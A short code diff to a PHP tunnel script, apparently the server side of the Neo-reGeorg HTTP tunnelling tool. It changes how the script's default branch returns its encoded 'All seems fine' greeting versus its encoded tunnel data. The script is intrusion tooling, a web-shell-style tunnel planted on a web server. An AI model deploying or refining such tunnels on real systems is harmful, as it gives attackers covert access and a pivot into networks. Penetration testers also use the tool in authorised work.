@@ -184,10 +184,14 @@ switch($cmd){
         }
         break;
     default: {
+        $sayhello = true;
         @session_start();
         session_write_close();
-        exit(base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en)));
     }
 }
-echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
+if ( $sayhello ) {
+    echo base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en));
+} else {
+    echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
+}
 ?>
